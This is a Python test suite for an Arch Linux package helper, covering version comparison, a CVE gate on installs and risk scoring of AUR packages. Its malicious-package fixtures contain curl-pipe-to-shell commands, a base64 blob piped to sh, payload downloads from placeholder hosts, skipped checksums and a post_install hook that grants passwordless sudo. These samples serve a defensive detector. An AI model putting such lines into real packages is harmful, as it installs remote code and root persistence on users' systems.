import os
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "desktop", "arch", "rootfs", "usr", "lib", "kwick", "arch"))

from kwickarch import aur, ops, tracker, util
from kwickarch.vercmp import vercmp

FAILS = []


def check(name, cond, detail=""):
    print("%s %s%s" % ("ok  " if cond else "FAIL", name, (" -- " + str(detail)) if detail and not cond else ""))
    if not cond:
        FAILS.append(name)


def fake_tracker(rows):
    t = tracker.Tracker(offline=True)
    t._index(rows, time.time())
    return t


AVGS = [
    {"name": "AVG-1", "packages": ["libfoo"], "status": "Vulnerable", "severity": "High", "type": "arbitrary code execution", "affected": "1.0-1", "fixed": None, "issues": ["CVE-2026-0001"]},
    {"name": "AVG-2", "packages": ["libbar"], "status": "Vulnerable", "severity": "Medium", "type": "denial of service", "affected": "2.0-1", "fixed": None, "issues": ["CVE-2026-0002"]},
    {"name": "AVG-3", "packages": ["app"], "status": "Vulnerable", "severity": "Low", "type": "information disclosure", "affected": "3.0-1", "fixed": None, "issues": ["CVE-2026-0003"]},
    {"name": "AVG-4", "packages": ["libold"], "status": "Fixed", "severity": "Critical", "type": "arbitrary code execution", "affected": "1.0-1", "fixed": "1.2-1", "issues": ["CVE-2026-0004"]},
    {"name": "AVG-5", "packages": ["libup"], "status": "Vulnerable", "severity": "High", "type": "privilege escalation", "affected": "5.1-1", "fixed": None, "issues": ["CVE-2026-0005"]},
    {"name": "AVG-6", "packages": ["libnope"], "status": "Not affected", "severity": "High", "type": "unknown", "affected": "1-1", "fixed": None, "issues": ["CVE-2026-0006"]},
]


class FakeDB:
    def __init__(self, local, sync):
        self._local = local
        self._sync = sync

    def local(self):
        return self._local

    def sync_by_name(self):
        return self._sync

    def groups(self, name):
        return []

    def repo_satisfies(self, dep):
        return self._sync.get(dep)


def entry(n, v, r="extra"):
    return {"name": n, "version": v, "repo": r}


def test_vercmp():
    check("vercmp epoch", vercmp("1:1.0-1", "2.0-1") > 0)
    check("vercmp alpha", vercmp("1.0a-1", "1.0-1") < 0)
    check("vercmp release", vercmp("1.0-10", "1.0-9") > 0)


def test_tracker():
    t = fake_tracker(AVGS)
    check("open high issue matches", [a["avg"] for a in t.issues("libfoo", "9.9-1")] == ["AVG-1"])
    check("fixed issue below fix matches", [a["avg"] for a in t.issues("libold", "1.1-1")] == ["AVG-4"])
    check("fixed issue at fix does not match", t.issues("libold", "1.2-1") == [])
    check("not affected ignored", t.issues("libnope", "1-1") == [])
    check("pkgbase match", [a["avg"] for a in t.issues("libfoo-docs", "1.0-1", "libfoo")] == ["AVG-1"])


def test_gate():
    t = fake_tracker(AVGS)
    sync = {n: {"name": n, "base": n, "version": v} for n, v in [("app", "3.1-1"), ("libfoo", "1.5-1"), ("libbar", "2.2-1"), ("libup", "5.2-1"), ("clean", "1-1")]}
    util._conf = dict(util.DEFAULTS)
    db = FakeDB({}, sync)
    blocked, warns = ops.gate([entry("app", "3.1-1")], ["app"], db, t, False)
    check("target with a Low CVE is refused", [e["name"] for e in blocked] == ["app"])
    blocked, warns = ops.gate([entry("clean", "1-1"), entry("libbar", "2.2-1")], ["clean"], db, t, False)
    check("dependency with a Medium CVE only warns", not blocked and [e["name"] for e in warns] == ["libbar"])
    blocked, warns = ops.gate([entry("clean", "1-1"), entry("libfoo", "1.5-1")], ["clean"], db, t, False)
    check("dependency with a High CVE is refused", [e["name"] for e in blocked] == ["libfoo"])
    blocked, warns = ops.gate([entry("clean", "1-1"), entry("libfoo", "1.5-1")], ["clean"], db, t, True)
    check("--allow-vulnerable lets it through", blocked and not any(e["blocked"] for e in blocked))
    db2 = FakeDB({"libup": {"name": "libup", "base": "libup", "version": "5.1-1", "explicit": False}}, sync)
    blocked, warns = ops.gate([entry("libup", "5.2-1")], [], db2, t, False)
    check("upgrade keeping an existing High CVE is not refused", not blocked and warns and warns[0]["role"] == "upgrade")
    db3 = FakeDB({"libfoo": {"name": "libfoo", "base": "libfoo", "version": "0.9-1", "explicit": False}}, sync)
    t2 = fake_tracker([dict(AVGS[0], affected="1.5-1", status="Vulnerable"), dict(AVGS[0], name="AVG-9", fixed="1.0-1", status="Fixed")])
    blocked, warns = ops.gate([entry("libfoo", "1.5-1")], [], db3, t2, False)
    check("upgrade that brings a new High CVE is refused", [e["name"] for e in blocked] == ["libfoo"])


SRCINFO_BAD = """pkgbase = evil-helper
\tpkgdesc = helper
\tpkgver = 1.0
\tpkgrel = 1
\turl = https://example.org
\tinstall = evil.install
\tarch = x86_64
\tsource = https://pastebin.com/raw/abc
\tsource = http://203.0.113.9/payload.tar.gz
\tsource = https://downloads.example-cdn.net/tool.tar.gz
\tsha256sums = SKIP
\tsha256sums = SKIP
\tsha256sums = 0000000000000000000000000000000000000000000000000000000000000000

pkgname = evil-helper
"""

PKGBUILD_BAD = """pkgname=evil-helper
pkgver=1.0
pkgrel=1
arch=(x86_64)
url=https://example.org
install=evil.install
source=("https://pastebin.com/raw/abc" "http://203.0.113.9/payload.tar.gz" "https://downloads.example-cdn.net/tool.tar.gz")
sha256sums=('SKIP' 'SKIP' '0000000000000000000000000000000000000000000000000000000000000000')
build() {
  curl -fsSL https://example.org/setup.sh | bash
  echo "ZWNobyBoZWxsbyB3b3JsZDsgY3VybCBodHRwczovL2V4YW1wbGUub3JnL3BheWxvYWQgfCBzaDsgZWNobyBkb25lOyBybSAtcmYgL3RtcC94eXo7IGVjaG8gb2s7IGVjaG8gb2s7IGVjaG8gb2s7IGVjaG8gb2s=" | base64 -d | sh
}
package() {
  install -Dm755 tool "$pkgdir/usr/bin/tool"
}
"""

INSTALL_BAD = """post_install() {
  curl -s https://example.org/x | sh
  echo 'kwick ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
}
"""

SRCINFO_OK = """pkgbase = nice-tool
\tpkgdesc = nice
\tpkgver = 2.0
\tpkgrel = 1
\turl = https://github.com/nice/tool
\tarch = x86_64
\tmakedepends = git
\tsource = nice-tool-2.0.tar.gz::https://github.com/nice/tool/archive/v2.0.tar.gz
\tsha256sums = 1111111111111111111111111111111111111111111111111111111111111111

pkgname = nice-tool
"""

PKGBUILD_OK = """pkgname=nice-tool
pkgver=2.0
pkgrel=1
arch=(x86_64)
url=https://github.com/nice/tool
source=("$pkgname-$pkgver.tar.gz::https://github.com/nice/tool/archive/v$pkgver.tar.gz")
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')
build() {
  cd tool-$pkgver
  make
}
package() {
  cd tool-$pkgver
  make DESTDIR="$pkgdir" install
}
"""


def test_risk():
    now = time.time()
    meta_bad = {"Name": "evil-helper", "PackageBase": "evil-helper", "NumVotes": 0, "Popularity": 0, "Maintainer": "newbie", "Submitter": "newbie",
                "FirstSubmitted": now - 3 * 86400, "LastModified": now - 3600, "OutOfDate": None, "URL": "https://example.org"}
    files = {"PKGBUILD": PKGBUILD_BAD.encode(), ".SRCINFO": SRCINFO_BAD.encode(), "evil.install": INSTALL_BAD.encode()}
    findings, sources = aur.analyze(files, aur.parse_srcinfo(SRCINFO_BAD), meta_bad, [])
    ids = {f["id"] for f in findings}
    check("malicious PKGBUILD is high risk", aur.risk(findings) == "high")
    for want in ("pipe-to-shell", "decode-exec", "encoded-blob", "checksum-skip", "bad-host", "plain-http", "unusual-domain",
                 "install-script", "persistence", "network-in-build", "new-package", "no-votes"):
        check("finding " + want, want in ids, sorted(ids))
    meta_ok = {"Name": "nice-tool", "PackageBase": "nice-tool", "NumVotes": 250, "Popularity": 4.2, "Maintainer": "alice", "Submitter": "alice",
               "FirstSubmitted": now - 900 * 86400, "LastModified": now - 60 * 86400, "OutOfDate": None, "URL": "https://github.com/nice/tool"}
    files = {"PKGBUILD": PKGBUILD_OK.encode(), ".SRCINFO": SRCINFO_OK.encode()}
    findings, sources = aur.analyze(files, aur.parse_srcinfo(SRCINFO_OK), meta_ok, [])
    check("ordinary PKGBUILD is low risk", aur.risk(findings) == "low", findings)
    hist = [{"commit": "b" * 40, "author": "mallory", "email": "", "date": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(now - 86400)), "subject": "update"},
            {"commit": "a" * 40, "author": "alice", "email": "", "date": "2024-01-01T00:00:00Z", "subject": "initial"}]
    check("new committer is flagged", any(f["id"] == "new-committer" for f in aur.history_findings(hist)))


def test_tree():
    entries = {"PKGBUILD": (b"100644", b"pkgname=x\n"), "keys/pgp/A.asc": (b"100644", b"key\n"), "run.sh": (b"100755", b"#!/bin/sh\n")}
    got = aur.git_tree(entries)
    try:
        with tempfile.TemporaryDirectory() as d:
            subprocess.run(["git", "init", "-q", d], check=True)
            for rel, (mode, data) in entries.items():
                p = os.path.join(d, rel)
                os.makedirs(os.path.dirname(p), exist_ok=True)
                with open(p, "wb") as f:
                    f.write(data)
                os.chmod(p, 0o755 if mode == b"100755" else 0o644)
            subprocess.run(["git", "-C", d, "add", "-A"], check=True)
            want = subprocess.run(["git", "-C", d, "write-tree"], check=True, stdout=subprocess.PIPE, text=True).stdout.strip()
        check("git tree hash matches git write-tree", got == want, (got, want))
    except (OSError, subprocess.CalledProcessError):
        print("skip git tree hash (git not available)")


test_vercmp()
test_tracker()
test_gate()
test_risk()
test_tree()
print("%d failure(s)" % len(FAILS))
sys.exit(1 if FAILS else 0)
